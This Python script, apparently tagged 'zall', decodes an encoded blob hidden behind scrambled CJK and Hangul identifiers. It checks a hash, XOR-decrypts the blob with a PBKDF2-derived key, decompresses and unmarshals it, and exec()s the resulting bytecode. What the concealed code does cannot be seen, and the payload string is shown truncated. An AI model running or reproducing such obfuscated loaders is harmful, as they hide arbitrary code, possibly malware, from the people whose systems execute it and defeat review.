# -*- coding: utf-8 -*-
import sys,zlib,marshal,hashlib,random
띝㸊떆='䩱栖볐쇣쥍푢蔮怛雖䯲춶詂疍侢쵏껀朕윷뛽鞅衼閁糟㙣䶀펒섉公攁鄀梙緎柀飻컑鹄쳶臃囈穾낣䄪蕕褄숴颔撝谷낣䄪囈穾嵛㪱눎借雳㼭䁪뻯좃㙌柀[...]
㔖붛腋=720677766218
鳥䡦䒼=bytes.fromhex('dde5bd1e789a265470f7032a98f9a78167c46b7c409c91998d1bbbd1ab8ebf6f')
䃕쎩漹='kkEuJfBHrXLOCRxFXIL8APg7RFvAXtqE'
㫞㽬뒝='2e9b9f5a172d8654bc793fe6186251a45588d9d539e7a32dc6fb00aa2c99b6f0'
def 뺪쩒殕(㨮楓䮈):
    몾䌥僲=[]
    for 壉䐬礈 in [(19968, 40959), (13312, 19903), (44032, 55203)]:
        몾䌥僲.extend(range(壉䐬礈[0],壉䐬礈[1]+1))
    random.Random(㨮楓䮈).shuffle(몾䌥僲)
    扒诬㓳={}
    for 蝭鐻 in range(256):
        扒诬㓳[chr(몾䌥僲[蝭鐻*2])+chr(몾䌥僲[蝭鐻*2+1])]=蝭鐻
    return 扒诬㓳
def 逯榄쩘(㨮楓䮈,몾䌥僲):
    䣸솢蜻=[]
    for 壉䐬礈 in range(0,len(㨮楓䮈),2):
        䣸솢蜻.append(몾䌥僲[㨮楓䮈[壉䐬礈:壉䐬礈+2]])
    return bytes(䣸솢蜻)
def 淔뼥欁(㨮楓䮈,몾䌥僲):
    壉䐬礈=len(몾䌥僲)
    return bytes(蝭鐻^몾䌥僲[湴㭊%壉䐬礈] for 湴㭊,蝭鐻 in enumerate(㨮楓䮈))
匟훽솪=뺪쩒殕(㔖붛腋)
峩糍뎾=逯榄쩘(띝㸊떆,匟훽솪)
䍲䳫贩=hashlib.sha256(峩糍뎾).hexdigest()
if 䍲䳫贩!=㫞㽬뒝:
    print('\033[91m[zall] INTEGRITY FAILED\033[0m');sys.exit(1)
䱶㶃偷=hashlib.pbkdf2_hmac('sha256',䃕쎩漹.encode(),鳥䡦䒼,iterations=200000)
폣梫䇟=淔뼥欁(峩糍뎾,䱶㶃偷)
쀯䴂뵘=zlib.decompress(폣梫䇟)
䟘뮾䵐=marshal.loads(쀯䴂뵘)
exec(䟘뮾䵐,{'__name__':'__main__','__file__':'<protected>'})
